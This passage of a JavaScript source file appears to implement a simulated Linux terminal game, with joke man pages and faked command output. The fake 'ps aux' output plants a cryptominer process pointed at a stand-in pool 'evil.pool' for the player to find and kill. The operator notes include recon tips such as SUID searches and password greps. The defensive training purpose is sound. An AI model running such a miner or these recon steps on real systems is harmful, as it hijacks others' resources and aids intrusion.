      |  _  | |
      |_| |_|_|

OPERATOR NOTES
       Use figlet when you need to:
       • Create ASCII banners for scripts
       • Make your terminal output impressive
       • Add flair to MOTD or documentation

       Install on real Linux: sudo apt install figlet

SEE ALSO
       banner(1), toilet(1), cowsay(1)`,

            'cmatrix': `CMATRIX(1)                      User Commands                      CMATRIX(1)

NAME
       cmatrix - simulates the display from "The Matrix"

SYNOPSIS
       cmatrix [-abBflohnsuV] [-C color] [-s] [-u update_delay]

DESCRIPTION
       cmatrix shows text flying in and out in a terminal, similar to
       The Matrix movie. It operates in text mode and can display using
       a variety of fonts.

OPTIONS
       -a     Asynchronous scroll.

       -b     Bold characters on.

       -B     All bold characters.

       -f     Force Linux $TERM type.

       -l     Linux mode (requires root).

       -o     Use old-style scrolling.

       -s     Screensaver mode.

       -u delay
              Update delay (0-9, default 4).

       -C color
              Use specified color (green, red, blue, white, yellow,
              cyan, magenta, black).

EXAMPLES
       cmatrix
              Start Matrix rain animation.

       cmatrix -B -C green
              All bold, green (classic Matrix look).

       cmatrix -s
              Screensaver mode (quits on keypress).

       cmatrix -u 2
              Faster scroll speed.

KEYBOARD
       q      Quit cmatrix.
       Ctrl+C Interrupt and exit.
       0-9    Adjust speed.

CULTURAL NOTE
       Inspired by the 1999 film "The Matrix", the green cascading
       characters have become an iconic representation of "hacking"
       in popular culture. Real hacking looks nothing like this.

OPERATOR NOTES
       Use cmatrix when you need to:
       • Impress non-technical observers
       • Pretend you're in a movie
       • Have a cool screensaver

       Install on real Linux: sudo apt install cmatrix

SEE ALSO
       sl(1), hollywood(1), cowsay(1)`,

            'lolcat': `LOLCAT(6)                       Games Manual                       LOLCAT(6)

NAME
       lolcat - rainbow coloring for text

SYNOPSIS
       lolcat [options] [files...]

DESCRIPTION
       lolcat concatenates files (or standard input) to standard output,
       adding rainbow coloring to the text. It's like cat, but with
       fabulous rainbow colors.

OPTIONS
       -a, --animate
              Enable animation mode.

       -d, --duration
              Animation duration.

       -s, --speed
              Animation speed.

       -f, --freq
              Rainbow frequency (default: 0.1).

       -p, --spread
              Rainbow spread (default: 3.0).

       -F, --force
              Force color even when stdout is not a tty.

       -v, --version
              Show version.

EXAMPLES
       echo "Hello World" | lolcat
              Rainbow text.

       cat file.txt | lolcat
              Rainbow file contents.

       figlet "HELLO" | lolcat
              Rainbow ASCII art!

       fortune | cowsay | lolcat
              The ultimate combo.

       ls -la | lolcat
              Even ls can be fabulous.

OPERATOR NOTES
       Use lolcat when you need to:
       • Add color to boring terminal output
       • Make your scripts more festive
       • Annoy people who prefer minimalism

       Install on real Linux: sudo apt install lolcat (or gem install lolcat)

SEE ALSO
       cat(1), cowsay(1), figlet(6)`,

            'hollywood': `HOLLYWOOD(1)                    User Commands                    HOLLYWOOD(1)

NAME
       hollywood - fill your console with Hollywood melodrama technobabble

SYNOPSIS
       hollywood

DESCRIPTION
       hollywood creates a fake "hacking" display that looks like something
       from a movie. It splits the terminal into multiple panes showing
       various streams of data, hex dumps, code, and other "computery"
       looking things.

       This is purely for entertainment. Real security work involves
       reading logs, searching files, and drinking coffee - not watching
       colorful animations while dramatically saying "I'm in."

FEATURES
       • Multiple split panes with fake data streams
       • Scrolling hexadecimal dumps
       • Fake compile/download progress bars
       • Random "ACCESS GRANTED" messages
       • Dramatic sound effects (if enabled)

USAGE
       Just run 'hollywood' and watch the show.
       Press Ctrl+C (multiple times) to exit.

MOVIE HACKING VS REAL HACKING
       ┌──────────────────────────────────────────────────────────────┐
       │              MOVIE HACKING       │       REAL HACKING        │
       ├──────────────────────────────────────────────────────────────┤
       │  3D flying through cyberspace   │  grep -r "password" /var  │
       │  "I'm bypassing the mainframe"  │  "Let me check the logs"  │
       │  Dramatic music intensifies     │  Coffee machine intensifies│
       │  Two people on one keyboard     │  One person, five tabs    │
       │  Done in 30 seconds             │  Done in 30 hours maybe   │
       │  "I'm in!"                      │  "Permission denied"      │
       └──────────────────────────────────────────────────────────────┘

OPERATOR NOTES
       Use hollywood when you need to:
       • Impress your non-technical friends
       • Pretend you're in a 90s hacker movie
       • Take a break from actual work

       Install on real Linux: sudo apt install hollywood

SEE ALSO
       cmatrix(1), sl(1), cowsay(1)`,

            'yes': `YES(1)                          User Commands                         YES(1)

NAME
       yes - output a string repeatedly until killed

SYNOPSIS
       yes [STRING]...

DESCRIPTION
       Repeatedly output a line with all specified STRING(s), or 'y'.

       --help  display help and exit
       --version output version information and exit

EXAMPLES
       yes
              Output 'y' forever (or until Ctrl+C).

       yes no
              Output 'no' forever.

       yes "I agree" | head -5
              Output "I agree" 5 times.

       yes | rm -i *.tmp
              Auto-confirm all deletion prompts.

PRACTICAL USES
       Auto-accept prompts:
              yes | apt-get install package

       Fill disk (testing):
              yes "test" > /dev/null &

       Stress test:
              yes > /dev/null &

       Generate test data:
              yes "test line" | head -1000 > testfile.txt

WARNING
       yes without redirection or piping will flood your terminal
       indefinitely. Use Ctrl+C to stop it.

OPERATOR NOTES
       Use yes when you need to:
       • Auto-accept interactive prompts in scripts
       • Generate test data quickly
       • Stress test systems (carefully)

       Pro tip: yes | command auto-answers "y" to all prompts.
       Useful for batch operations: yes | apt-get install -y package

SEE ALSO
       true(1), false(1), head(1)`,

            // ═══════════════════════════════════════════════════════════════
            // SYSTEM ADMINISTRATION
            // ═══════════════════════════════════════════════════════════════

            'service': `SERVICE(8)                      System Administration                  SERVICE(8)

NAME
       service - run a System V init script

SYNOPSIS
       service SCRIPT COMMAND [OPTIONS]
       service --status-all

DESCRIPTION
       service runs a System V init script or systemd unit in as predictable
       an environment as possible, removing most environment variables and
       with the current working directory set to /.

       SCRIPT is the name of the init script in /etc/init.d/ (without .sh
       extension) or the systemd service name.

       COMMAND can be at least start, stop, status, and restart.

COMMANDS
       start   Start the service.
       stop    Stop the service.
       restart Restart the service (stop then start).
       reload  Reload configuration without full restart.
       status  Show current status of the service.

OPTIONS
       --status-all
              Run all init scripts with the status command.

EXAMPLES
       service ssh status
              Check SSH daemon status.

       service apache2 restart
              Restart Apache web server.

       service --status-all
              Show status of all services.

       service cron start
              Start the cron daemon.

       service nginx reload
              Reload Nginx configuration.

OPERATOR NOTES
       Use service when you need to:
       • Start/stop/restart system services
       • Check if a service is running
       • Reload service configuration after changes
       • Audit what services are active on a system

       Pro tip: service vs systemctl:
       • service is the older SysV init interface
       • systemctl is the modern systemd interface
       • Most distros support both for compatibility
       • Use systemctl for more control: systemctl list-units --type=service

       Security check: service --status-all shows what's running.
       Look for unexpected services or ones that shouldn't be enabled.

SEE ALSO
       systemctl(1), init(8)`,

            'journalctl': `JOURNALCTL(1)                   User Commands                    JOURNALCTL(1)

NAME
       journalctl - query the systemd journal

SYNOPSIS
       journalctl [OPTIONS...] [MATCHES...]

DESCRIPTION
       journalctl may be used to query the contents of the systemd journal
       as written by systemd-journald.service.

       Without arguments, shows the full contents of the journal, starting
       with the oldest entry collected.

OPTIONS
       -f, --follow
              Show only the most recent journal entries, and continuously
              print new entries as they are appended to the journal.

       -n, --lines=
              Show the most recent N journal entries. Defaults to 10.

       -r, --reverse
              Reverse output so that the newest entries are displayed first.

       -u, --unit=UNIT
              Show messages for the specified systemd unit.

       -p, --priority=
              Filter output by message priorities. Takes: emerg, alert,
              crit, err, warning, notice, info, debug.

       --since=, --until=
              Show entries since/until specified date.

       -b, --boot
              Show messages from the current boot, or a specific boot.

       -k, --dmesg
              Show only kernel messages.

       --no-pager
              Do not pipe output into a pager.

EXAMPLES
       journalctl
              Show all journal entries.

       journalctl -f
              Follow new log entries in real-time.

       journalctl -n 50
              Show the last 50 log entries.

       journalctl -u ssh
              Show logs for SSH service only.

       journalctl -p err
              Show only error messages and above.

       journalctl --since "1 hour ago"
              Show logs from the last hour.

       journalctl -b -1
              Show logs from the previous boot.

       journalctl _UID=1000
              Show logs from user with UID 1000.

OPERATOR NOTES
       Use journalctl when you need to:
       • Investigate system events and errors
       • Track service failures and restarts
       • Correlate events across multiple services
       • Perform forensic analysis of system activity

       Pro tip: Essential forensic patterns:
       journalctl -p err -b            # Errors since boot
       journalctl --since "2 hours ago" | grep -i fail
       journalctl _COMM=sudo           # All sudo usage
       journalctl _UID=0               # All root activity
       journalctl -u sshd --since today # SSH activity today

       Journal is binary - use journalctl, not cat!
       Files in /var/log/journal/ are not human-readable.

SEE ALSO
       systemd(1), systemctl(1), syslog(3)`,

            'arp': `ARP(8)                       Linux System Administration                   ARP(8)

NAME
       arp - manipulate the system ARP cache

SYNOPSIS
       arp [-vn] [-H type] [-i if] -a [hostname]
       arp [-v] [-i if] -d hostname [pub]
       arp [-v] [-H type] [-i if] -s hostname hw_addr [temp]

DESCRIPTION
       Arp manipulates or displays the kernel's IPv4 network neighbour cache.
       It can add entries to the table, delete one or display the current
       content.

OPTIONS
       -a [hostname]
              Display (all) entries of the ARP table.

       -d hostname
              Remove an entry from the ARP table.

       -s hostname hw_addr
              Manually add an entry to the ARP table.

       -n, --numeric
              Shows numerical addresses instead of trying to determine
              symbolic host, port or user names.

       -v, --verbose
              Verbose mode.

       -i if, --device if
              Select an interface.

EXAMPLES
       arp -a
              Show all ARP table entries.

       arp -n
              Show ARP table with numeric IPs (no DNS lookup).

       arp -d 192.168.1.100
              Delete entry for specified IP.

       arp -s 192.168.1.50 00:11:22:33:44:55
              Manually add a static ARP entry.

OPERATOR NOTES
       Use arp when you need to:
       • See what hosts are on the local network
       • Detect ARP spoofing/poisoning attacks
       • Troubleshoot network connectivity issues
       • Identify MAC addresses of network devices

       Pro tip: ARP is essential for network recon:
       arp -a                          # What's on the network?
       arp -n | grep -v "incomplete"   # Active hosts only
       Look for: duplicate IPs (ARP spoofing), unexpected MACs,
       entries that change frequently (possible MITM attack).

       Modern replacement: ip neigh show
       arp is deprecated but still widely used.

SEE ALSO
       ip(8), rarp(8), ethers(5)`,

            'route': `ROUTE(8)                     Linux System Administration                  ROUTE(8)

NAME
       route - show / manipulate the IP routing table

SYNOPSIS
       route [-CFvnee]
       route [-v] [-A family] add [-net|-host] target [OPTIONS]
       route [-v] [-A family] del [-net|-host] target [OPTIONS]

DESCRIPTION
       Route manipulates the kernel's IP routing tables. Its primary use
       is to set up static routes to specific hosts or networks via an
       interface after it has been configured.

OPTIONS
       -n     Show numerical addresses instead of resolving names.

       -e     Use netstat-format for displaying the routing table.

       -v     Verbose mode.

       -F     Display the Forwarding Information Base (default).

       -C     Display the routing cache instead of the FIB.

EXAMPLES
       route
              Display the routing table.

       route -n
              Display routing table with numeric IPs.

       route add default gw 192.168.1.1
              Add default gateway.

       route add -net 10.0.0.0 netmask 255.0.0.0 gw 192.168.1.254
              Add route to 10.x.x.x network.

       route del default
              Delete the default route.

OUTPUT COLUMNS
       Destination   Target network or host
       Gateway       Gateway address (* means none)
       Genmask       Netmask for the target network
       Flags         U=up, G=gateway, H=host, !=reject
       Metric        Distance to target
       Iface         Interface to use

OPERATOR NOTES
       Use route when you need to:
       • Understand network topology
       • Identify where traffic is being routed
       • Troubleshoot connectivity issues
       • Detect unauthorized route changes (pivoting)

       Pro tip: route reveals network architecture:
       route -n                        # Where does traffic go?
       Look for: multiple gateways (multi-homed host),
       routes to internal networks (pivot points),
       unexpected default gateways (MITM).

       Modern replacement: ip route show
       route is deprecated but still widely used.

SEE ALSO
       ip(8), netstat(8), iptables(8)`,

            'atq': `ATQ(1)                          User Commands                          ATQ(1)

NAME
       atq - list the user's pending jobs

SYNOPSIS
       atq [-V] [-q queue]

DESCRIPTION
       atq lists the user's pending at jobs. If invoked by the superuser,
       lists all users' pending jobs. The format of output is: job number,
       date, hour, queue, and username.

OPTIONS
       -V     Print version number.

       -q queue
              Show jobs in the specified queue.

AT QUEUES
       Queues are designated by single letters. Queue 'a' is the default.
       Higher letter = lower priority.

EXAMPLES
       atq
              List all pending scheduled jobs.

OUTPUT FORMAT
       Each line shows:
       JOB#   DATE      TIME    QUEUE   USER
       42     Mon Feb 3 15:00:00 2025 a operator

OPERATOR NOTES
       Use atq when you need to:
       • See what jobs are scheduled to run
       • Detect persistence mechanisms
       • Audit scheduled tasks on a system
       • Find malicious scheduled commands

       Pro tip: atq is forensic gold for persistence:
       atq                             # What's scheduled?
       at -c JOBNUMBER                 # Show job contents
       Attackers use 'at' for delayed execution to avoid detection.
       Also check: crontab -l, /etc/cron.*, systemd timers

SEE ALSO
       at(1), atrm(1), cron(8)`,

            'atrm': `ATRM(1)                         User Commands                         ATRM(1)

NAME
       atrm - delete jobs queued for later execution

SYNOPSIS
       atrm job [job...]

DESCRIPTION
       atrm deletes jobs, identified by their job number, which were
       previously created with the at command.

EXAMPLES
       atrm 42
              Remove job number 42.

       atrm 1 2 3
              Remove multiple jobs.

OPERATOR NOTES
       Use atrm when you need to:
       • Remove scheduled malicious jobs
       • Clean up after finding persistence
       • Cancel accidentally scheduled tasks

       Pro tip: Always use atq first to identify jobs,
       then at -c JOBNUMBER to inspect before removing.
       Document job contents before removal for forensics!

SEE ALSO
       at(1), atq(1), cron(8)`,

            'time': `TIME(1)                         User Commands                         TIME(1)

NAME
       time - run programs and summarize system resource usage

SYNOPSIS
       time [options] command [arguments...]

DESCRIPTION
       The time command runs the specified program command with the given
       arguments. When command finishes, time displays information about
       resources used by command.

OUTPUT
       time displays three values:
       real   Wall clock time - total elapsed time.
       user   CPU time spent in user-mode code.
       sys    CPU time spent in kernel-mode code.

       real = user + sys + I/O wait + other processes' time

OPTIONS
       -p     Use portable output format.

       -v     Verbose mode (GNU time only).

       -f format
              Specify output format (GNU time only).

EXAMPLES
       time ls -la
              Time how long ls takes.

       time sleep 5
              Shows ~5 seconds real time.

       time find / -name "*.log" 2>/dev/null
              Time a file search.

       time tar -czf backup.tar.gz /data
              Time a backup operation.

UNDERSTANDING THE OUTPUT
       $ time grep -r "password" /var/log
       real    0m2.345s    ← Total time elapsed
       user    0m0.123s    ← CPU time in user code
       sys     0m0.067s    ← CPU time in kernel

       If real >> user+sys: The command was waiting (I/O, network, etc.)
       If user >> sys: CPU-intensive in userspace
       If sys >> user: Lots of system calls / kernel activity

OPERATOR NOTES
       Use time when you need to:
       • Benchmark command performance
       • Compare different approaches
       • Identify slow operations
       • Profile scripts

       Pro tip: Useful for profiling recon:
       time nmap -sS target               # How long for a scan?
       time find / -perm -4000 2>/dev/null # SUID search time
       Compare times to identify what's slowing operations.

SEE ALSO
       times(2), clock(3)`
        };

        // Check for man page
        if (manPages[cmd]) {
            return manPages[cmd];
        }

        // Check for alias commands
        const aliases = {
            'vi': 'vim',
            'netcat': 'nc',
            'freq': 'tune',
            'frequency': 'tune',
            'frequencies': 'scan'
        };
        if (aliases[cmd] && manPages[aliases[cmd]]) {
            return manPages[aliases[cmd]];
        }

        return `No manual entry for ${cmd}`;
    }

    _cmdGrep(args, pipeInput = null) {
        // Parse flags
        let countOnly = false;      // -c
        let showLineNumbers = false; // -n
        let ignoreCase = false;      // -i
        let invertMatch = false;     // -v
        let recursiveSearch = false; // -r (just acknowledge, don't implement)
        let extendedRegex = false;   // -E (egrep mode - JS regex is already extended)
        let onlyMatching = false;    // -o (only show matched portion)

        const nonFlagArgs = [];
        for (const arg of args) {
            if (arg === '-c') countOnly = true;
            else if (arg === '-n') showLineNumbers = true;
            else if (arg === '-i') ignoreCase = true;
            else if (arg === '-v') invertMatch = true;
            else if (arg === '-r') recursiveSearch = true;
            else if (arg === '-E') extendedRegex = true;
            else if (arg === '-o') onlyMatching = true;
            else if (arg.startsWith('-') && arg.length > 1) {
                // Handle combined flags like -ci, -in, -cin, -Ei
                for (const char of arg.slice(1)) {
                    if (char === 'c') countOnly = true;
                    else if (char === 'n') showLineNumbers = true;
                    else if (char === 'i') ignoreCase = true;
                    else if (char === 'v') invertMatch = true;
                    else if (char === 'r') recursiveSearch = true;
                    else if (char === 'E') extendedRegex = true;
                    else if (char === 'o') onlyMatching = true;
                }
            } else {
                nonFlagArgs.push(arg);
            }
        }

        const pattern = nonFlagArgs[0];
        const file = nonFlagArgs[1];

        if (!pattern) return 'grep: missing pattern';

        // Get content from pipe or file
        let content = pipeInput || '';
        if (file) {
            content = this._cmdCat([file]);
            if (content.startsWith('cat:')) return content.replace('cat:', 'grep:');
        } else if (!content) {
            return 'grep: missing file operand';
        }

        const regexFlags = ignoreCase ? 'gi' : 'g';
        const regex = new RegExp(pattern, regexFlags);

        const lines = content.split('\n');
        const matches = [];

        for (let i = 0; i < lines.length; i++) {
            const line = lines[i];

            if (onlyMatching) {
                // -o: only show matched portions
                const matchResult = line.match(regex);
                if (matchResult && !invertMatch) {
                    for (const m of matchResult) {
                        matches.push(showLineNumbers ? `${i + 1}:${m}` : m);
                    }
                }
            } else {
                const isMatch = regex.test(line);
                regex.lastIndex = 0; // Reset regex state for global flag

                if (invertMatch ? !isMatch : isMatch) {
                    if (showLineNumbers) {
                        matches.push(`${i + 1}:${line}`);
                    } else {
                        matches.push(line);
                    }
                }
            }
        }

        // -c flag: return count only
        if (countOnly) {
            return String(matches.length);
        }

        return matches.join('\n') || '';
    }

    _cmdFind(args) {
        const startPath = args.find(a => !a.startsWith('-')) || '.';
        const nameArg = args.indexOf('-name');
        const pattern = nameArg >= 0 ? args[nameArg + 1] : null;
        const permArg = args.indexOf('-perm');
        const permValue = permArg >= 0 ? args[permArg + 1] : null;

        // Handle SUID search: find / -perm -4000 or -perm -u+s
        if (permValue && (permValue.includes('4000') || permValue.includes('u+s'))) {
            if (this.config.suidBinaries && this.config.suidBinaries.length > 0) {
                return this.config.suidBinaries.join('\n');
            }
            // Default SUID binaries
            return `/usr/bin/passwd
/usr/bin/sudo
/usr/bin/su
/usr/bin/mount
/usr/bin/ping`;
        }

        // Handle world-writable search: find / -perm -o+w or -perm -0002 or -perm -777
        if (permValue && (permValue.includes('w') || permValue.includes('0002') || permValue.includes('777') || permValue.includes('666'))) {
            if (this.config.writableFiles && this.config.writableFiles.length > 0) {
                return this.config.writableFiles.join('\n');
            }
            // Default writable files
            return `/tmp/test.txt
/var/tmp/cache`;
        }

        // Handle SGID search: find / -perm -2000
        if (permValue && permValue.includes('2000')) {
            return `/usr/bin/wall
/usr/bin/write`;
        }

        // Standard find by name
        const resolved = this._resolvePath(startPath);
        const results = [];

        for (const path of Object.keys(this.fs)) {
            if (path.startsWith(resolved)) {
                const name = path.split('/').pop();
                if (!pattern || name.includes(pattern.replace(/\*/g, ''))) {
                    results.push(path);
                }
            }
        }
        return results.join('\n');
    }

    _cmdHead(args, pipeInput = null) {
        const n = args.includes('-n') ? parseInt(args[args.indexOf('-n') + 1]) || 10 : 10;
        const file = args.filter(a => !a.startsWith('-') && isNaN(a))[0];

        // Get content from pipe or file
        let content = pipeInput || '';
        if (file) {
            content = this._cmdCat([file]);
            if (content.startsWith('cat:')) return content.replace('cat:', 'head:');
        } else if (!content) {
            return 'head: missing file operand';
        }
        return content.split('\n').slice(0, n).join('\n');
    }

    _cmdTail(args, pipeInput = null) {
        const n = args.includes('-n') ? parseInt(args[args.indexOf('-n') + 1]) || 10 : 10;
        const file = args.filter(a => !a.startsWith('-') && isNaN(a))[0];

        // Get content from pipe or file
        let content = pipeInput || '';
        if (file) {
            content = this._cmdCat([file]);
            if (content.startsWith('cat:')) return content.replace('cat:', 'tail:');
        } else if (!content) {
            return 'tail: missing file operand';
        }
        return content.split('\n').slice(-n).join('\n');
    }

    _cmdWc(args, pipeInput = null) {
        const showLines = args.includes('-l');
        const showWords = args.includes('-w');
        const showChars = args.includes('-c') || args.includes('-m');
        const showAll = !showLines && !showWords && !showChars;
        const file = args.filter(a => !a.startsWith('-'))[0];

        // Get content from pipe or file
        let content = pipeInput || '';
        if (file) {
            content = this._cmdCat([file]);
            if (content.startsWith('cat:')) return content.replace('cat:', 'wc:');
        } else if (!content) {
            return 'wc: missing file operand';
        }

        const lines = content.split('\n').filter(l => l).length;
        const words = content.split(/\s+/).filter(w => w).length;
        const chars = content.length;

        // Build output based on flags (order: lines, words, chars)
        const parts = [];
        if (showAll || showLines) parts.push(String(lines).padStart(7));
        if (showAll || showWords) parts.push(String(words).padStart(7));
        if (showAll || showChars) parts.push(String(chars).padStart(7));

        const counts = parts.join(' ');
        return file ? `${counts} ${file}` : counts;
    }

    _cmdPs(args) {
        if (args.includes('aux') || args.includes('-aux') || args.includes('-ef')) {
            return `USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.1 168936 11420 ?        Ss   Jan17   0:03 /sbin/init
root         2  0.0  0.0      0     0 ?        S    Jan17   0:00 [kthreadd]
root       345  0.0  0.2  45320  8192 ?        Ss   Jan17   0:12 /usr/sbin/sshd -D
root       456  0.0  0.1  28976  5120 ?        Ss   Jan17   0:05 /usr/sbin/cron -f
www-data   789  0.0  0.3  82456 12288 ?        S    Jan17   0:45 nginx: worker process
${this.user}    1234  0.0  0.2  21432  4532 pts/0    Ss   10:00   0:00 -bash
nobody    6666 98.5  2.1 512000 86420 ?        RN   09:15  42:17 rogue_agent --mine --pool stratum+tcp://evil.pool:3333
${this.user}    5678  0.0  0.1  38372  3456 pts/0    R+   10:30   0:00 ps aux`;
        }
        return `  PID TTY          TIME CMD
 1234 pts/0    00:00:00 bash
 5678 pts/0    00:00:00 ps`;
    }

    // ═══════════════════════════════════════════════════════════════
    // JOB CONTROL COMMANDS
    // ═══════════════════════════════════════════════════════════════

    _cmdJobs() {
        if (this._jobs.length === 0) {
            return '';
        }
        return this._jobs.map(job => {
            const statusStr = job.status === 'running' ? 'Running' : 'Stopped';
            const current = job === this._jobs[this._jobs.length - 1] ? '+' : '-';
            return `[${job.id}]${current}  ${statusStr.padEnd(20)} ${job.command}`;
        }).join('\n');
    }

    _cmdFg(args) {
        let job;
        if (args.length === 0) {
            // Get most recent job
            job = this._jobs[this._jobs.length - 1];
        } else {
            // Parse job specifier (%1 or just 1)
            const jobId = parseInt(args[0].replace('%', ''), 10);
            job = this._jobs.find(j => j.id === jobId);
        }

        if (!job) {
            return 'fg: no current job';
        }

        // Remove from jobs list and "run" in foreground
        job.status = 'running';
        this._currentForegroundJob = job;
        // Simulate immediate completion
        this._jobs = this._jobs.filter(j => j.id !== job.id);
        this._currentForegroundJob = null;
        return job.command;
    }

    _cmdBg(args) {
        let job;
        if (args.length === 0) {
            // Get most recent stopped job
            job = [...this._jobs].reverse().find(j => j.status === 'stopped');
        } else {
            const jobId = parseInt(args[0].replace('%', ''), 10);
            job = this._jobs.find(j => j.id === jobId);
        }

        if (!job) {
            return 'bg: no current job';
        }

        if (job.status === 'running') {
            return `bg: job ${job.id} already in background`;
        }

        job.status = 'running';
        return `[${job.id}]+ ${job.command} &`;
    }

    _cmdKill(args) {
        // Parse signal and PID
        let signal = 'TERM';
        let pid = null;

        for (const arg of args) {
            if (arg.startsWith('-')) {
                signal = arg.replace(/^-+/, '').toUpperCase();
                if (signal === '9') signal = 'KILL';
                if (signal === '15') signal = 'TERM';
            } else {
                pid = parseInt(arg, 10);
            }
        }

        if (!pid) {
            return 'kill: missing operand';
        }

        // Simulate kill output based on PID
        if (pid === 6666) {
            return `[1]-  Terminated              rogue_agent --mine --pool stratum+tcp://evil.pool:3333`;
        } else if ([1, 2, 345, 456, 789].includes(pid)) {
            return `kill: (${pid}) - Operation not permitted`;
        } else if (pid === 1234 || pid === 5678) {
            return ''; // Successfully "killed" user processes
        } else {
            return `kill: (${pid}) - No such process`;
        }
    }

    _cmdKillall(args) {
        const name = args.find(a => !a.startsWith('-'));
        if (!name) {
            return 'killall: missing operand';
        }

        // Simulate killall
        if (name === 'rogue_agent' || name === 'rogue') {
            return `[1]-  Terminated              rogue_agent`;
        } else if (['init', 'sshd', 'cron', 'nginx'].includes(name)) {
            return `killall: ${name}: Operation not permitted`;
        }
        return `killall: ${name}: no process found`;
    }

    _cmdNohup(args) {
        if (args.length === 0) {
            return 'nohup: missing operand';
        }

        const command = args.join(' ').replace(/&$/, '').trim();
        const pid = this._nextPid++;

        // Add as a background job
        const job = {
            id: this._nextJobId++,
            pid: pid,
            command: `nohup ${command}`,
            status: 'running'
        };
        this._jobs.push(job);

        return `nohup: ignoring input and appending output to 'nohup.out'\n[${job.id}] ${pid}`;
    }

    _cmdPgrep(args) {
        const name = args.find(a => !a.startsWith('-'));
        if (!name) {
            return 'pgrep: missing pattern';
        }

        // Simulate pgrep against known processes
        const processes = {
            'init': '1',
            'sshd': '345',
            'cron': '456',
            'nginx': '789',
            'bash': '1234',
            'rogue': '6666',
            'rogue_agent': '6666'
        };

        const matches = Object.entries(processes)
            .filter(([proc]) => proc.includes(name.toLowerCase()))
            .map(([, pid]) => pid);

        if (matches.length === 0) {
            return '';
        }
        return matches.join('\n');
    }

    _cmdDf(args) {
        const h = args.includes('-h');
        if (h) {
            return `Filesystem      Size  Used Avail Use% Mounted on
/dev/sda1        50G   15G   33G  31% /
tmpfs           2.0G     0  2.0G   0% /dev/shm
/dev/sda2       100G   45G   50G  48% /home`;
        }
        return `Filesystem     1K-blocks     Used Available Use% Mounted on
/dev/sda1       52428800 15728640  34603008  31% /
tmpfs            2097152        0   2097152   0% /dev/shm
/dev/sda2      104857600 47185920  52428800  48% /home`;
    }

    _cmdDu(args) {
        const h = args.includes('-h');
        const s = args.includes('-s');
        const path = args.filter(a => !a.startsWith('-'))[0] || '.';
        if (s && h) return `4.5M\t${path}`;
        if (s) return `4608\t${path}`;
        return `4.0K\t${path}/file1\n8.0K\t${path}/dir1\n4.5M\t${path}`;
    }

    _cmdIp(args) {
        if (args[0] === 'addr' || args[0] === 'a') {
            return `1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536
    inet 127.0.0.1/8 scope host lo
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 192.168.1.100/24 brd 192.168.1.255 scope global eth0`;
        }
        if (args[0] === 'route' || args[0] === 'r') {
            return `default via 192.168.1.1 dev eth0
192.168.1.0/24 dev eth0 proto kernel scope link src 192.168.1.100`;
        }
        return 'Usage: ip [addr|route]';
    }

    _cmdIfconfig() {
        return `eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.100  netmask 255.255.255.0  broadcast 192.168.1.255
        ether 00:0c:29:ab:cd:ef  txqueuelen 1000  (Ethernet)

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)`;
    }

    _cmdNetstat(args) {
        if (args.includes('-tuln') || args.includes('-tulnp')) {
            return `Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN
udp        0      0 0.0.0.0:68              0.0.0.0:*`;
        }
        return `Active Internet connections
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 192.168.1.100:22        192.168.1.50:52413      ESTABLISHED`;
    }

    _cmdLast() {
        return `${this.user}   pts/0        192.168.1.50     Sun Jan 18 09:55   still logged in
${this.user}   pts/0        192.168.1.50     Sat Jan 17 14:22 - 18:30  (04:08)
reboot   system boot  5.15.0-generic   Sat Jan 17 14:20
${this.user}   pts/0        192.168.1.50     Fri Jan 16 09:00 - 17:30  (08:30)

wtmp begins Fri Jan 16 09:00:00 2026`;
    }

    _cmdW() {
        return ` 10:30:00 up 5 days,  3:42,  1 user,  load average: 0.08, 0.12, 0.09
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
${this.user}   pts/0    192.168.1.50     09:55    0.00s  0.02s  0.00s w`;
    }

    _cmdFree(args) {
        if (args.includes('-h')) {
            return `              total        used        free      shared  buff/cache   available
Mem:          7.8Gi       2.1Gi       3.2Gi       256Mi       2.5Gi       5.2Gi
Swap:         2.0Gi          0B       2.0Gi`;
        }
        return `              total        used        free      shared  buff/cache   available
Mem:        8167736     2202624     3355648      262144     2609464     5461248
Swap:       2097148           0     2097148`;
    }

    _cmdLscpu() {
        return `Architecture:            x86_64
CPU op-mode(s):          32-bit, 64-bit
Byte Order:              Little Endian
CPU(s):                  4
On-line CPU(s) list:     0-3
Thread(s) per core:      2
Core(s) per socket:      2
Socket(s):               1
Vendor ID:               GenuineIntel
CPU family:              6
Model name:              Intel(R) Core(TM) i5-8250U CPU @ 1.60GHz
CPU MHz:                 1800.000
L1d cache:               64 KiB
L1i cache:               64 KiB
L2 cache:                512 KiB
L3 cache:                6 MiB`;
    }

    _cmdTop() {
        return `top - 10:30:00 up 5 days,  3:42,  1 user,  load average: 0.08, 0.12, 0.09
Tasks: 128 total,   1 running, 127 sleeping,   0 stopped,   0 zombie
%Cpu(s):  2.3 us,  1.0 sy,  0.0 ni, 96.5 id,  0.2 wa,  0.0 hi,  0.0 si
MiB Mem :   7976.3 total,   3276.8 free,   2150.2 used,   2549.3 buff/cache
MiB Swap:   2048.0 total,   2048.0 free,      0.0 used.   5333.2 avail Mem

  PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND
    1 root      20   0  168936  11420   8256 S   0.0   0.1   0:03.45 systemd
 1234 ${this.user}    20   0   21432   4532   3648 S   0.0   0.1   0:00.12 bash`;
    }

    _cmdSystemctl(args) {
        // Initialize custom timers storage
        if (!this.systemdTimers) {
            this.systemdTimers = [];
        }

        if (args[0] === 'list-units' || args.includes('--type=service')) {
            return `UNIT                     LOAD   ACTIVE SUB     DESCRIPTION
sshd.service             loaded active running OpenSSH server daemon
nginx.service            loaded active running A high performance web server
mysql.service            loaded active running MySQL Community Server
cron.service             loaded active running Regular background program processing`;
        }

        if (args[0] === 'status') {
            const unit = args[1] || 'sshd';

            // Check if it's a timer
